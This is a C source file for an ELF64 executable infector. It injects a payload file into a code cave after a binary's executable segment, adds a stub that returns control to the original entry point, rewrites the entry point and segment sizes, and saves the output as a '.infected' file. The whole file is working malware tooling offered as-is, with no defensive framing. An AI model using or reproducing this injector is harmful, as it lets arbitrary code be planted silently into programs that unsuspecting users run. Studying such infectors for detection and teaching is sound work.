#include <stdint.h>
#include <elf.h>

#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>

#include <stdlib.h>
#include <string.h>
#include <libgen.h>

#include <sys/mman.h>

#include "min_max.h"
#include "mem_search.h"
#include "file_io.h"
#include "elf_map.h"
#include "str_manip.h"
#include "help.h"

#define CODE_CAVE_PADDING 8

uint8_t payload_prefix[] = {
    0x48, 0x8d, 0x05, 0xff, 0xff, 0xff, 0xff,   // lea  -0x1(%rip),%rax
    0x50,                                       // push %rax
};

int main(int argc, char* argv[]) {
    if (argc < 3 || argc > 3) {
        help(argv[0]);
        return (0);
    }

    size_t map_size;
    uint8_t* map = map_file_at_path(argv[1], PROT_READ | PROT_WRITE, MAP_PRIVATE, &map_size);
    if (map == MAP_FAILED) {
        exit_error("failed to load target file");
    }

    size_t payload_size;
    uint8_t* payload = alloc_file_at_path(argv[2], &payload_size);
    if (payload == NULL) {
        (void)munmap(map, map_size);
        exit_error("failed to load payload");
    }

    elf64_map_t elf_map = map_elf64(map, map_size);
    if (elf_map.start == NULL) {
        (void)munmap(map, map_size);
        free(payload);
        exit_error("failed to map ELF headers in target file");
    }

    Elf64_Phdr* executable_header = find_program_header(elf_map, PT_LOAD, PF_R | PF_X);
    if (executable_header == NULL) {
        (void)munmap(map, map_size);
        free(payload);
        exit_error("failed to find a suitable location for the payload");
    }

    uint8_t* code_cave = (uint8_t*)find_code_cave(
        elf_map.start + executable_header->p_offset + executable_header->p_filesz,
        sizeof(payload_prefix) + payload_size,
        sizeof(payload_prefix) + payload_size + CODE_CAVE_PADDING * 2 + 100,
        CODE_CAVE_PADDING
    );

    if (code_cave == NULL) {
        (void)munmap(map, map_size);
        free(payload);
        exit_error("failed to find a suitable location for the payload");
    }

    int offset = elf_map.header->e_entry - (code_cave - elf_map.start) - 7;

    memcpy(payload_prefix + 3, &offset, 4);
    memcpy(code_cave, payload_prefix, sizeof(payload_prefix));
    memcpy(code_cave + sizeof(payload_prefix), payload, payload_size);

    free(payload);

    executable_header->p_filesz = umax(
        executable_header->p_filesz,
        (code_cave - elf_map.start) + sizeof(payload_prefix) + payload_size - executable_header->p_offset
    );
    executable_header->p_memsz = umax(
        executable_header->p_memsz,
        executable_header->p_filesz
    );
    elf_map.header->e_entry = code_cave - elf_map.start;

    char* out_file_name = str_join(basename(argv[1]), ".infected");
    if (out_file_name == NULL) {
        (void)munmap(map, map_size);
        exit_error("failed to create the output file");
    }

    printf("Created: %s\n", out_file_name);
    int out_fd = open(out_file_name, O_CREAT | O_WRONLY, 0744);
    free(out_file_name);
    if (out_fd == -1){
        (void)munmap(map, map_size);
        exit_error("failed to create the output file");
    }

    ssize_t bytes_written = write(out_fd, map, map_size);
    close(out_fd);
    (void)munmap(map, map_size);
    if (bytes_written == -1) {
        exit_error("failed to write to the output file");
    }
    
    return (0);
}